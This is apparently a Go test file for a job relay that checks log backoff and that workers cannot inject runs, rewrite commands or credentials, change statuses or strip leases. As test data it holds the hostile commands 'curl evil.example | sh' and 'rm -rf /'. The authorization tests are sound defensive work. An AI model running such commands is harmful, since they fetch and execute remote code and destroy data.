package relay_test

import (
	"context"
	"errors"
	"github.com/kordloom/switchtender/internal/run"
	"go.uber.org/zap"
	"net/http"
	"net/http/httptest"
	"strconv"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/kordloom/switchtender/internal/relay"
)

// TestDownRelayIsNotAskedPerWrite pins that a relay refusing posts is retried on a backoff rather
// than asked once for every chunk of output a run produces.
//
// A batch that reaches the size threshold posts immediately, and a failed post puts its bytes back,
// which leaves the buffer over the threshold. Every subsequent append was therefore a size-triggered
// flush: with the relay down, a hundred small writes became a hundred synchronous failing requests,
// each paying a connection attempt on the path the run's own output travels.
func TestDownRelayIsNotAskedPerWrite(t *testing.T) {
	t.Parallel()
	var posts atomic.Int64
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if strings.HasSuffix(r.URL.Path, "/log") {
			posts.Add(1)
			// The relay is up but refusing, which is what a restarting control node looks like.
			w.WriteHeader(http.StatusServiceUnavailable)
			return
		}
		w.WriteHeader(http.StatusNoContent)
	}))
	defer srv.Close()

	transport := relay.NewHTTPTransport(srv.URL, "worker-token", srv.Client())
	ctx := context.Background()

	// Fill the batch past its size threshold so every following write is a size-triggered flush.
	big := make([]byte, 64<<10)
	if err := transport.AppendLog(ctx, "run_1", big); err != nil {
		t.Fatalf("AppendLog(big) error = %v", err)
	}
	afterFill := posts.Load()

	// Now write a hundred small chunks, the shape a chatty tool produces.
	const writes = 100
	for i := 0; i < writes; i++ {
		if err := transport.AppendLog(ctx, "run_1", []byte("a line of output\n")); err != nil {
			t.Fatalf("AppendLog(%d) error = %v", i, err)
		}
	}
	extra := posts.Load() - afterFill

	// Without a backoff this is one post per write. With one, the writes land inside a single
	// backoff window and cost nothing. A small allowance covers a timer firing mid-loop.
	if extra > 5 {
		t.Errorf("%d posts for %d writes against a down relay, want the writes to coalesce behind "+
			"a retry backoff instead of each paying its own failing request", extra, writes)
	}
	t.Logf("posts: %d to fill, %d more across %d writes", afterFill, extra, writes)
}

// TestRelayRecoversAfterBackoff pins that output buffered while the relay was down is delivered once
// it comes back, so the backoff delays posts rather than dropping them.
func TestRelayRecoversAfterBackoff(t *testing.T) {
	t.Parallel()
	var down atomic.Bool
	var delivered atomic.Int64
	down.Store(true)
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if strings.HasSuffix(r.URL.Path, "/log") && down.Load() {
			w.WriteHeader(http.StatusServiceUnavailable)
			return
		}
		if strings.HasSuffix(r.URL.Path, "/log") {
			delivered.Add(1)
		}
		w.WriteHeader(http.StatusNoContent)
	}))
	defer srv.Close()

	transport := relay.NewHTTPTransport(srv.URL, "worker-token", srv.Client())
	ctx := context.Background()
	if err := transport.AppendLog(ctx, "run_1", make([]byte, 64<<10)); err != nil {
		t.Fatalf("AppendLog() error = %v", err)
	}
	down.Store(false)

	// A terminal save flushes whatever is buffered, which is the path that must not be held off by
	// a backoff opened while the relay was down.
	if err := transport.AppendLog(ctx, "run_1", []byte("tail\n")); err != nil {
		t.Fatalf("AppendLog(tail) error = %v", err)
	}
	flusher, ok := transport.(interface {
		FlushLogForTest(context.Context, string) error
	})
	if !ok {
		t.Fatal("the HTTP transport does not expose its flush to tests")
	}
	if err := flusher.FlushLogForTest(ctx, "run_1"); err != nil {
		t.Fatalf("flush after recovery error = %v", err)
	}
	if delivered.Load() == 0 {
		t.Error("nothing was delivered after the relay came back, so the buffered output was lost")
	}
}

// TestWorkerCannotInjectOrRewriteARun pins that the relay accepts an outcome report and nothing
// more.
//
// The save endpoint used to decode a whole run and upsert it, so a holder of the worker token could
// post a run that did not exist, with any playbook, command, and credential ids it chose, and the
// control node's claim loop would lease and execute it. That path answers to no approval policy, no
// object grant, and no audit entry, because it never reaches the API gate.
func TestWorkerCannotInjectOrRewriteARun(t *testing.T) {
	t.Parallel()
	ctx := context.Background()
	backing := run.NewMemStore()
	srv := httptest.NewServer(relay.NewHandler(backing, "worker-token", zap.NewNop(), nil))
	defer srv.Close()
	client := relay.NewClient(relay.NewHTTPTransport(srv.URL, "worker-token", srv.Client()))

	// A run the control node accepted, after checking policy and grants.
	original := &run.Run{
		ID: "run_real", Playbook: "site.yml", Tool: "ansible", Status: run.StatusRunning,
		CredentialIDs: []string{"cred_readonly"}, CreatedAt: time.Now(), ClaimedBy: "worker-a",
	}
	if err := backing.Save(ctx, original); err != nil {
		t.Fatalf("seed Save() error = %v", err)
	}

	// A worker reporting an outcome may not also rewrite what the run executes.
	rewritten := original.Clone()
	rewritten.Status = run.StatusSucceeded
	rewritten.Command = "curl evil.example | sh"
	rewritten.Tool = "bash"
	rewritten.CredentialIDs = []string{"cred_prod_root"}
	if err := client.Save(ctx, rewritten); err != nil {
		t.Fatalf("Save() error = %v", err)
	}
	got, err := backing.Get(ctx, "run_real")
	if err != nil {
		t.Fatalf("Get() error = %v", err)
	}
	if got.Status != run.StatusSucceeded {
		t.Errorf("status = %q, want the reported succeeded: a worker's outcome must land", got.Status)
	}
	if got.Command != "" || got.Tool != "ansible" {
		t.Errorf("a worker rewrote the spec: tool %q command %q", got.Tool, got.Command)
	}
	if len(got.CredentialIDs) != 1 || got.CredentialIDs[0] != "cred_readonly" {
		t.Errorf("a worker changed the credentials to %v, so it granted itself secrets the control "+
			"node never authorized", got.CredentialIDs)
	}

	// A run that does not exist cannot be created through the relay.
	injected := &run.Run{
		ID: "run_injected", Playbook: "evil.yml", Tool: "bash", Command: "rm -rf /",
		Status: run.StatusPending, CreatedAt: time.Now(),
	}
	if err := client.Save(ctx, injected); err == nil {
		t.Error("a worker created a new run through the relay, which the claim loop would then " +
			"execute with no policy, grant, or audit check")
	}
	if _, err := backing.Get(ctx, "run_injected"); !errors.Is(err, run.ErrNotFound) {
		t.Error("the injected run reached the store")
	}
}

// TestWorkerCannotSetAStatusItHasNoBusinessSetting pins that a worker reports how a run ended and
// cannot decide whether it starts.
//
// Constraining the spec was not enough. The status is what decides execution: a report of "pending"
// moved a run awaiting an approver into the queue, where the claim loop ran it past the policy, the
// approver, and the audit gate. A second report rewound a finished run and ran it again. One shared
// worker token was all either needed.
func TestWorkerCannotSetAStatusItHasNoBusinessSetting(t *testing.T) {
	t.Parallel()
	ctx := context.Background()
	backing := run.NewMemStore()
	srv := httptest.NewServer(relay.NewHandler(backing, "worker-token", zap.NewNop(), nil))
	defer srv.Close()
	client := relay.NewClient(relay.NewHTTPTransport(srv.URL, "worker-token", srv.Client()))

	tests := []struct {
		Name     string
		Stored   run.Status
		Reported run.Status
	}{
		{Name: "release a run awaiting an approver", Stored: run.StatusPendingApproval,
			Reported: run.StatusPending},
		{Name: "requeue a run so it executes again", Stored: run.StatusRunning,
			Reported: run.StatusPending},
		{Name: "reopen a finished run", Stored: run.StatusSucceeded, Reported: run.StatusRunning},
		{Name: "reopen a rejected run", Stored: run.StatusRejected, Reported: run.StatusRunning},
	}
	for i, test := range tests {
		t.Run(test.Name, func(t *testing.T) {
			id := "run_status_" + strconv.Itoa(i)
			stored := &run.Run{
				ID: id, Playbook: "site.yml", Status: test.Stored, CreatedAt: time.Now(),
				ClaimedBy: "worker-a",
			}
			if err := backing.Save(ctx, stored); err != nil {
				t.Fatalf("seed Save() error = %v", err)
			}
			report := stored.Clone()
			report.Status = test.Reported
			if err := client.Save(ctx, report); err == nil {
				t.Errorf("a worker moved a %q run to %q", test.Stored, test.Reported)
			}
			got, err := backing.Get(ctx, id)
			if err != nil {
				t.Fatalf("Get() error = %v", err)
			}
			if got.Status != test.Stored {
				t.Errorf("stored status changed to %q, want it left at %q", got.Status, test.Stored)
			}
		})
	}

	// The legitimate report still works.
	live := &run.Run{ID: "run_live", Playbook: "site.yml", Status: run.StatusRunning,
		CreatedAt: time.Now(), ClaimedBy: "worker-a"}
	if err := backing.Save(ctx, live); err != nil {
		t.Fatalf("seed Save() error = %v", err)
	}
	done := live.Clone()
	done.Status = run.StatusSucceeded
	if err := client.Save(ctx, done); err != nil {
		t.Fatalf("a worker could not report success: %v", err)
	}
	if got, _ := backing.Get(ctx, "run_live"); got.Status != run.StatusSucceeded {
		t.Errorf("status = %q, want succeeded: a worker's real outcome must land", got.Status)
	}
}

// TestWorkerCannotStripALeaseOrReportOnAnothersRun pins that a report comes from the run's holder
// and cannot clear who holds it.
//
// The lease used to be copied straight from the request body, and an omitted field decodes to the
// empty string. A parent that is running with no holder is exactly what the abandoned-parent sweep
// settles, so one request cleared a live split's lease and the next janitor tick interrupted the
// run and canceled every shard. With one shared worker token, that was a remote kill switch on any
// long-running fan-out.
func TestWorkerCannotStripALeaseOrReportOnAnothersRun(t *testing.T) {
	t.Parallel()
	ctx := context.Background()
	backing := run.NewMemStore()
	srv := httptest.NewServer(relay.NewHandler(backing, "worker-token", zap.NewNop(), nil))
	defer srv.Close()
	client := relay.NewClient(relay.NewHTTPTransport(srv.URL, "worker-token", srv.Client()))
	held := time.Now()

	// A split parent being coordinated right now.
	parent := &run.Run{
		ID: "run_parent", Playbook: "site.yml", Kind: run.KindSplit, Status: run.StatusRunning,
		CreatedAt: time.Now().Add(-time.Hour), ClaimedBy: "coordinator-a", ClaimedAt: &held,
	}
	if err := backing.Save(ctx, parent); err != nil {
		t.Fatalf("seed Save() error = %v", err)
	}
	// A report that omits the lease must not clear it.
	strip := parent.Clone()
	strip.ClaimedBy = ""
	strip.ClaimedAt = nil
	_ = client.Save(ctx, strip)
	got, err := backing.Get(ctx, "run_parent")
	if err != nil {
		t.Fatalf("Get() error = %v", err)
	}
	if got.ClaimedBy != "coordinator-a" {
		t.Errorf("the lease was cleared to %q, which makes the sweep settle a healthy run and "+
			"cancel every shard under it", got.ClaimedBy)
	}
	if run.AbandonedParent(got, time.Now().Add(-30*time.Second)) {
		t.Error("the parent is now sweepable, so the next janitor tick kills a coordinated run")
	}

	// A report from anyone other than the holder is refused.
	other := parent.Clone()
	other.ClaimedBy = "worker-b"
	other.Status = run.StatusCanceled
	if err := client.Save(ctx, other); err == nil {
		t.Error("a worker canceled a run held by another executor")
	}

	// A queued run nobody claimed cannot be reported finished, which would suppress the work.
	queued := &run.Run{
		ID: "run_queued", Playbook: "site.yml", Status: run.StatusPending, CreatedAt: time.Now(),
	}
	if err := backing.Save(ctx, queued); err != nil {
		t.Fatalf("seed Save() error = %v", err)
	}
	done := queued.Clone()
	done.Status = run.StatusSucceeded
	if err := client.Save(ctx, done); err == nil {
		t.Error("a worker marked an unclaimed queued run succeeded, so its playbook never runs " +
			"and nobody is told")
	}
	if after, _ := backing.Get(ctx, "run_queued"); after.Status != run.StatusPending {
		t.Errorf("queued run status = %q, want it left pending", after.Status)
	}
}
